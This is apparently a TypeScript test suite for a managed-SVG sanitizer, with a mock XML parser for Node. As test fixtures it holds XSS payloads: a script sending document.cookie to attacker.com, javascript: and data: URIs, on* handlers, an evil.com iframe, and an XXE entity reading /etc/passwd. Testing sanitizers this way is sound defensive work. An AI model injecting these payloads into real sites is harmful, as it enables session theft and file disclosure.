import assert from 'node:assert/strict'

// Polyfill minimal DOMParser & XMLSerializer for headless Node.js CI test runner if not present
if (typeof globalThis.DOMParser === 'undefined') {
  const SVG_NS = 'http://www.w3.org/2000/svg'

  class MockAttr {
    name: string
    localName: string
    value: string
    prefix: string | null
    namespaceURI: string | null

    constructor(name: string, value: string) {
      this.name = name
      const parts = name.split(':')
      if (parts.length > 1) {
        this.prefix = parts[0]!
        this.localName = parts[1]!
      } else {
        this.prefix = null
        this.localName = name
      }
      this.value = value
      this.namespaceURI = this.prefix === 'xmlns' || name === 'xmlns' ? 'http://www.w3.org/2000/xmlns/' : null
    }
  }

  class MockElement {
    nodeType = 1
    tagName: string
    localName: string
    namespaceURI: string = SVG_NS
    attributes: MockAttr[] = []
    childNodes: Array<MockElement | MockTextNode> = []
    parentNode: MockElement | MockDocument | null = null

    constructor(tagName: string) {
      this.tagName = tagName
      const parts = tagName.split(':')
      this.localName = parts.length > 1 ? parts[1]! : tagName
    }

    getAttribute(name: string): string | null {
      const found = this.attributes.find((a) => a.name.toLowerCase() === name.toLowerCase())
      return found ? found.value : null
    }

    setAttribute(name: string, value: string): void {
      const found = this.attributes.find((a) => a.name.toLowerCase() === name.toLowerCase())
      if (found) {
        found.value = value
      } else {
        this.attributes.push(new MockAttr(name, value))
      }
    }

    removeAttributeNode(attr: MockAttr): void {
      const index = this.attributes.indexOf(attr)
      if (index !== -1) {
        this.attributes.splice(index, 1)
      }
    }

    remove(): void {
      if (this.parentNode && 'childNodes' in this.parentNode) {
        const index = this.parentNode.childNodes.indexOf(this)
        if (index !== -1) {
          this.parentNode.childNodes.splice(index, 1)
        }
      }
    }

    querySelectorAll(selector: string): MockElement[] {
      const results: MockElement[] = []
      const visit = (el: MockElement) => {
        for (const child of el.childNodes) {
          if (child.nodeType === 1) {
            const childEl = child as MockElement
            if (selector === '*' || childEl.localName.toLowerCase() === selector.toLowerCase()) {
              results.push(childEl)
            }
            visit(childEl)
          }
        }
      }
      visit(this)
      return results
    }

    getElementsByTagNameNS(_ns: string, localName: string): MockElement[] {
      return this.querySelectorAll(localName)
    }

    get textContent(): string {
      return this.childNodes.map((c) => c.textContent).join('')
    }
  }

  class MockTextNode {
    nodeType = 3
    textContent: string
    parentNode: MockElement | null = null

    constructor(text: string) {
      this.textContent = text
    }
  }

  class MockDocument {
    nodeType = 9
    doctype = null
    documentElement: MockElement | null = null
    childNodes: MockElement[] = []

    querySelector(selector: string): MockElement | null {
      if (selector === 'parsererror') return null
      return this.documentElement?.localName === selector ? this.documentElement : null
    }

    getElementsByTagNameNS(_ns: string, localName: string): MockElement[] {
      return this.documentElement ? [
        ...(this.documentElement.localName === localName ? [this.documentElement] : []),
        ...this.documentElement.getElementsByTagNameNS(_ns, localName),
      ] : []
    }
  }

  function parseXml(xml: string): MockDocument {
    const doc = new MockDocument()
    const tokenRegex = /<([a-zA-Z0-9:-]+)((?:\s+[^=>/]+(?:\s*=\s*(?:"[^"]*"|'[^']*'|[^\s>]+))?)*)\s*(\/?)>|<\/([a-zA-Z0-9:-]+)>|([^<]+)/g
    let current: MockElement | null = null
    let match: RegExpExecArray | null

    while ((match = tokenRegex.exec(xml)) !== null) {
      const [_full, openTag, rawAttrs, selfClose, closeTag, text] = match
      if (openTag) {
        const el = new MockElement(openTag)
        if (rawAttrs) {
          const attrRegex = /([a-zA-Z0-9:_-]+)\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+))/g
          let aMatch: RegExpExecArray | null
          while ((aMatch = attrRegex.exec(rawAttrs)) !== null) {
            const aName = aMatch[1]!
            const aVal = aMatch[2] ?? aMatch[3] ?? aMatch[4] ?? ''
            el.attributes.push(new MockAttr(aName, aVal))
          }
        }
        if (!doc.documentElement) {
          doc.documentElement = el
          doc.childNodes.push(el)
        }
        if (current) {
          el.parentNode = current
          current.childNodes.push(el)
        }
        if (!selfClose && openTag.toLowerCase() !== 'img') {
          current = el
        }
      } else if (closeTag) {
        if (current && current.tagName.toLowerCase() === closeTag.toLowerCase()) {
          current = current.parentNode as MockElement | null
        }
      } else if (text && text.trim()) {
        if (current) {
          const t = new MockTextNode(text)
          t.parentNode = current
          current.childNodes.push(t)
        }
      }
    }
    return doc
  }

  // @ts-expect-error polyfill for node test environment
  globalThis.DOMParser = class {
    parseFromString(str: string): MockDocument {
      return parseXml(str)
    }
  }

  // @ts-expect-error polyfill for node test environment
  globalThis.XMLSerializer = class {
    serializeToString(node: MockDocument | MockElement): string {
      const el = 'documentElement' in node ? node.documentElement : node
      if (!el) return ''
      function serialize(elem: MockElement): string {
        const attrs = elem.attributes.map((a) => ` ${a.name}="${a.value}"`).join('')
        if (elem.childNodes.length === 0) {
          return `<${elem.tagName}${attrs}/>`
        }
        const children = elem.childNodes
          .map((c) => (c.nodeType === 1 ? serialize(c as MockElement) : c.textContent))
          .join('')
        return `<${elem.tagName}${attrs}>${children}</${elem.tagName}>`
      }
      return serialize(el)
    }
  }
}

import {
  isUnsafeSvgScriptReference,
  parseManagedSvgSource,
  serializeManagedSvgDocument,
} from '../src/component-system/managedSvg'
import { parseManagedSvgSourceWithCompatibility } from '../src/component-system/managedSvgImportCompatibility'

console.log('--- Testing Managed SVG Security & XSS Sanitization ---')

// 1. isUnsafeSvgScriptReference unit tests
assert.equal(isUnsafeSvgScriptReference('javascript:alert(1)'), true)
assert.equal(isUnsafeSvgScriptReference('  javascript:void(0)  '), true)
assert.equal(isUnsafeSvgScriptReference('java\nscript:alert(1)'), true)
assert.equal(isUnsafeSvgScriptReference('vbscript:msgbox(1)'), true)
assert.equal(isUnsafeSvgScriptReference('data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='), true)
assert.equal(isUnsafeSvgScriptReference('expression(alert(1))'), true)
assert.equal(isUnsafeSvgScriptReference('//attacker.com'), true)
assert.equal(isUnsafeSvgScriptReference('  //attacker.com/xss  '), true)
assert.equal(isUnsafeSvgScriptReference('url(//attacker.com/foo)'), true)
assert.equal(isUnsafeSvgScriptReference('url("//attacker.com/foo")'), true)
assert.equal(isUnsafeSvgScriptReference('#local-anchor'), false)
assert.equal(isUnsafeSvgScriptReference('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII='), false)
assert.equal(isUnsafeSvgScriptReference('url(#gradient)'), false)

console.log('✔ isUnsafeSvgScriptReference unit checks passed')

// 2. <script> tags are stripped and discarded
const svgWithScript = `
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
  <script type="text/javascript">
    alert('XSS executed');
    document.location = 'http://attacker.com/?cookie=' + document.cookie;
  </script>
  <rect x="10" y="10" width="80" height="80" fill="#2563eb" />
</svg>
`

const parsedScript = parseManagedSvgSource(svgWithScript)
const serializedScript = serializeManagedSvgDocument(parsedScript.document)
assert.doesNotMatch(serializedScript, /<script/i, '<script> tag must be pruned')
assert.doesNotMatch(serializedScript, /alert/i, 'Script content must not be present')
assert.match(serializedScript, /<rect\b/, '<rect> graphic element must be preserved')
assert.match(serializedScript, /fill="#2563eb"/, 'Graphic attributes must be preserved')

console.log('✔ <script> tag stripping passed')

// 3. Inline event handlers (onload, onclick, onerror, etc.) are stripped
const svgWithEventHandlers = `
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" onload="alert('root')">
  <circle cx="50" cy="50" r="40" fill="#dc2626"
    onclick="alert('circle')"
    onmouseover="console.log('hover')"
    onerror="alert('error')"
  />
</svg>
`

const parsedHandlers = parseManagedSvgSource(svgWithEventHandlers)
const serializedHandlers = serializeManagedSvgDocument(parsedHandlers.document)
assert.doesNotMatch(serializedHandlers, /\bon[a-z]+\s*=/i, 'All on* event handlers must be stripped')
assert.match(serializedHandlers, /<circle\b/, '<circle> must be preserved')
assert.match(serializedHandlers, /cx="50"/, 'Safe attributes must be preserved')
assert.match(serializedHandlers, /fill="#dc2626"/, 'Fill must be preserved')

console.log('✔ Inline event handler stripping passed')

// 4. javascript: and vbscript: URIs in href and attributes are stripped
const svgWithJavascriptUri = `
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
  <a href="javascript:alert('xss1')">
    <text x="10" y="20">Click me</text>
  </a>
  <image href="javascript:alert('xss2')" width="50" height="50" />
</svg>
`

const parsedUri = parseManagedSvgSource(svgWithJavascriptUri)
const serializedUri = serializeManagedSvgDocument(parsedUri.document)
assert.doesNotMatch(serializedUri, /javascript\s*:/i, 'javascript: URIs must be stripped')
assert.doesNotMatch(serializedUri, /href="javascript/i, 'href attributes with javascript: must be stripped')
assert.match(serializedUri, /<text\b/, '<text> must be preserved')
assert.match(serializedUri, /Click me/, 'Text content must be preserved')

console.log('✔ javascript: URI stripping passed')

// 5. Style declarations with javascript: or expression() are sanitized
const svgWithMaliciousStyle = `
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
  <rect width="100" height="100" style="fill: #16a34a; background: url('javascript:alert(1)'); stroke: #0f172a" />
</svg>
`

const parsedStyle = parseManagedSvgSource(svgWithMaliciousStyle)
const serializedStyle = serializeManagedSvgDocument(parsedStyle.document)
assert.doesNotMatch(serializedStyle, /javascript/i, 'Unsafe style expressions must be dropped')
assert.match(serializedStyle, /fill="#16a34a"/, 'Safe fill must be preserved')
assert.match(serializedStyle, /stroke="#0f172a"/, 'Safe stroke must be preserved')

console.log('✔ Unsafe style declaration stripping passed')

// 5b. Protocol-relative URLs (//attacker.com) are stripped
const svgWithProtocolRelative = `
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
  <image href="//attacker.com/evil.png" width="50" height="50" />
  <rect width="100" height="100" style="fill: #16a34a; background: url('//attacker.com/leak'); stroke: #0f172a" />
</svg>
`
const parsedProtocolRelative = parseManagedSvgSourceWithCompatibility(svgWithProtocolRelative)
const serializedProtocolRelative = serializeManagedSvgDocument(parsedProtocolRelative.document)
assert.doesNotMatch(serializedProtocolRelative, /\/\/attacker\.com/i, 'Protocol-relative URLs must be stripped')
assert.match(serializedProtocolRelative, /<rect\b/, '<rect> must be preserved')

console.log('✔ Protocol-relative URL stripping passed')

// 6. parseManagedSvgSourceWithCompatibility handles mixed attack payloads seamlessly
const complexDirtySvg = `
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200" onload="alert('xss')">
  <script>/* evil */ var token = 'secret';</script>
  <g class="safe" onclick="steal(token)">
    <circle cx="100" cy="100" r="50" onfocus="alert(3)" />
  </g>
  <foreignObject width="100" height="100">
    <iframe src="http://evil.com"></iframe>
  </foreignObject>
</svg>
`

const compatResult = parseManagedSvgSourceWithCompatibility(complexDirtySvg)
const compatSerialized = serializeManagedSvgDocument(compatResult.document)

assert.doesNotMatch(compatSerialized, /<script/i, '<script> tag stripped')
assert.doesNotMatch(compatSerialized, /<foreignObject/i, '<foreignObject> tag stripped')
assert.doesNotMatch(compatSerialized, /<iframe/i, '<iframe> tag stripped')
assert.doesNotMatch(compatSerialized, /\bon[a-z]+\s*=/i, 'All on* event handlers stripped')
assert.doesNotMatch(compatSerialized, /javascript/i, 'All javascript: dropped')
assert.match(compatSerialized, /<circle\b/, '<circle> preserved')

console.log('✔ parseManagedSvgSourceWithCompatibility full sanitization passed')

// 7. DTD XXE entity injection still strictly fails closed
assert.throws(
  () =>
    parseManagedSvgSourceWithCompatibility(
      `<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><svg>&xxe;</svg>`,
    ),
  /SVG 不允许 DTD \/ ENTITY/,
)

console.log('✔ DTD XXE entity attacks continue to fail closed')
console.log('All Managed SVG Security & XSS sanitization checks PASSED successfully!')
